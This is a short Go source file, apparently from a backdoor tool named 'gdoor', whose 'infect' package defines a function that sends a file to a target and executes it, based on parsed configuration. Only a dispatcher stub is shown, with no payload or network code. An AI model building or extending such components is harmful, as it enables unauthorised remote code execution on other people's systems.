package infect

import (
	"gdoor/info"
)

func Infect(i *info.Info) {
	sendFileAndExecute(i, parseConfig(i))
}
